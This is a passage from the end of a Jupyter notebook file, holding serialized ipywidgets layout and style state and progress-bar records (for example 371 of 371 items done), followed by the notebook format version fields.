ull,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"cc02bffff8434a33a7378d8c0e5fc170":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"d1e34ae84d3e4f01b10eb18a383546c8":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"db033ecb31b4491c824d4092ad656d82":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"e89eb4243dd14110bc5124e8d97bfae3":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"ec764cc3127c492e9b74ddf0e62db416":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"ecaffe1539cd40359c1ff5b0b125f48a":{"model_module":"@jupyter-widgets/base","model_module_version":"1.2.0","model_name":"LayoutModel","state":{"_model_module":"@jupyter-widgets/base","_model_module_version":"1.2.0","_model_name":"LayoutModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"LayoutView","align_content":null,"align_items":null,"align_self":null,"border":null,"bottom":null,"display":null,"flex":null,"flex_flow":null,"grid_area":null,"grid_auto_columns":null,"grid_auto_flow":null,"grid_auto_rows":null,"grid_column":null,"grid_gap":null,"grid_row":null,"grid_template_areas":null,"grid_template_columns":null,"grid_template_rows":null,"height":null,"justify_content":null,"justify_items":null,"left":null,"margin":null,"max_height":null,"max_width":null,"min_height":null,"min_width":null,"object_fit":null,"object_position":null,"order":null,"overflow":null,"overflow_x":null,"overflow_y":null,"padding":null,"right":null,"top":null,"visibility":null,"width":null}},"ed87fe5043b144a181f175433aa7f83a":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"DescriptionStyleModel","state":{"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"DescriptionStyleModel","_view_count":null,"_view_module":"@jupyter-widgets/base","_view_module_version":"1.2.0","_view_name":"StyleView","description_width":""}},"f1230ab56c25452f86dee73ff84f9612":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"HTMLModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"HTMLModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"HTMLView","description":"","description_tooltip":null,"layout":"IPY_MODEL_12d8bbc2d148449998f48ff25cc41126","placeholder":"​","style":"IPY_MODEL_42397096967141da8ebdabbea10448e1","value":" 371/371 [04:54\u0026lt;00:00,  1.47it/s]"}},"f317baf73d664b878ea986af061d798f":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"FloatProgressModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"FloatProgressModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"ProgressView","bar_style":"success","description":"","description_tooltip":null,"layout":"IPY_MODEL_c7645c2860b048b2afb81883bbab1c47","max":93,"min":0,"orientation":"horizontal","style":"IPY_MODEL_3903d4f2dae74329aa4853e055a51750","value":93}},"f8b18681defa423a9889c3e6df3addfa":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"FloatProgressModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"FloatProgressModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"ProgressView","bar_style":"success","description":"","description_tooltip":null,"layout":"IPY_MODEL_a8491ea276e644688d968354ae331691","max":371,"min":0,"orientation":"horizontal","style":"IPY_MODEL_8c941746b74048afb97ac23b1efa120c","value":371}},"ffc08eb6b703410391267167955036c4":{"model_module":"@jupyter-widgets/controls","model_module_version":"1.5.0","model_name":"FloatProgressModel","state":{"_dom_classes":[],"_model_module":"@jupyter-widgets/controls","_model_module_version":"1.5.0","_model_name":"FloatProgressModel","_view_count":null,"_view_module":"@jupyter-widgets/controls","_view_module_version":"1.5.0","_view_name":"ProgressView","bar_style":"","description":"","description_tooltip":null,"layout":"IPY_MODEL_b618512822ac48a8b8be1fafb1a08b87","max":371,"min":0,"orientation":"horizontal","style":"IPY_MODEL_699dd5f8d1544c208b26bcfbdcb8cf6b","value":118}}}}},"nbformat":4,"nbformat_minor":0}